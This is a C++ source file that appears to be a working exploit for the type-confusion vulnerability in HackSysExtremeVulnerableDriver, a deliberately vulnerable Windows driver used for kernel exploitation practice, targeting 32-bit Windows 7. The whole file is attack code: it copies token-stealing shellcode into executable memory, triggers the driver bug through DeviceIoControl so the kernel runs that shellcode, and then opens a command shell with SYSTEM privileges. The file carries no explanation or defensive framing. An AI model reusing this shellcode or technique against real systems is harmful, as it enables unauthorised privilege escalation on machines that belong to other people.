// HEVD-TypeConfX86Win7.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>
#include <winioctl.h>
#include <stdint.h>
#include <malloc.h>

typedef struct _TCUOBJ {
	ULONG_PTR id;
	ULONG_PTR Type;
} TCUOBJ, *PTCUOBJ;

int main()
{
	HANDLE dev = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return 1;
	}

	DWORD outBytes = 0;

	char pl[60] =
		"\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\x31\xC0"
		"\xC3"
		;
	LPVOID pla = VirtualAlloc(
		NULL,
		sizeof(pl),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(pla, pl, sizeof(pl));
	//LPVOID plAddress = &pla;
	
	PTCUOBJ Tcuobj = NULL;
	Tcuobj = (PTCUOBJ)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(TCUOBJ)
	);

	Tcuobj->id = (ULONG_PTR)0x1;
	Tcuobj->Type = (ULONG_PTR)pla;

	DeviceIoControl(
		dev, 0x222023,
		(LPVOID)Tcuobj, sizeof(Tcuobj),
		NULL, 0, &outBytes, (LPOVERLAPPED)NULL
	);
	
	system("cmd.exe");
	//HeapFree(GetProcessHeap(), NULL, (LPVOID)&Tcuobj);
	//Tcuobj = NULL;
	CloseHandle(dev);
	system("pause");
	return 0;
}